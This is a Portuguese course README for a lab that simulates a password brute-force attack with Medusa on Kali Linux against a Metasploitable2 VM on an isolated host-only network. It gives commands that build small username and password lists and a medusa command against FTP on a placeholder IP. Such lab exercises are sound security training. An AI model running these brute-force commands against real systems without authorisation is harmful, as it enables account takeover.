# Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux no curso Santander - Cibersegurança 2025 da DIO

📘 1. Visão Geral do Projeto

Este documento descreve uma simulação educativa e autorizada de um ataque de força bruta (Brute Force) utilizando ferramentas do Kali Linux, com foco no utilitário Medusa.
O teste foi totalmente realizado em máquinas virtuais privadas, sem qualquer impacto externo.

⚠️ Aviso ético e legal
Este material destina-se exclusivamente ao estudo e à conscientização em Segurança da Informação.
Todos os testes foram feitos em um ambiente isolado, privado e autorizado pelo próprio autor.

🧪 2. Ambiente do Laboratório
🖥️ Máquina Atacante

SO: Kali Linux

Ferramenta principal: Medusa

Wordlists: listas educacionais (ex.: rockyou.txt)

🎯 Máquina Alvo

DVWA / Metasploitable / Servidor SSH local

Autenticação simples habilitada para testes

🌐 Rede
[ Kali Linux ] — Host-Only — [ VM Alvo ]


Rede isolada

Sem acesso à Internet

Sem risco para sistemas reais


# REQUISITOS:
Ter instalado o linux seja ele pelo VirtualBox ou se ter no sistema operacional da máquina.

Ter instalado o Metasploitable2 para servir como a máquina que será atacada


# CASO UTILIZAR NO VIRTUAL BOX:
Colocar ambas as máquinas na parte de rede em "placa de rede exclusiva de hospedeiro (host-only)"

# NO LINUX QUE VAI INVADIR:

COMANDO PARA CRIAR UMA LISTA DE USUÁRIOS:

echo -e 'users\nmsfadmin\nadmin\nroot' > users.txt

COMANDO PARA CRIAR UMA LISTA DE SENHAS:

echo -e '123456\nmsfadmin\nadmin\nroot' > pass.txt

COMANDO PARA USAR PARA TESTAR DIFERENTES USUARIOS E SENHAS:

medusa -h IP_DA_MAQUINA_A_SER_INVADIDA -U users.txt -P pass.txt -M ftp -t 6

# NO LINUX QUE VAI SER INVADIDO:

ip a -> para descobir qual é o ip da máquina
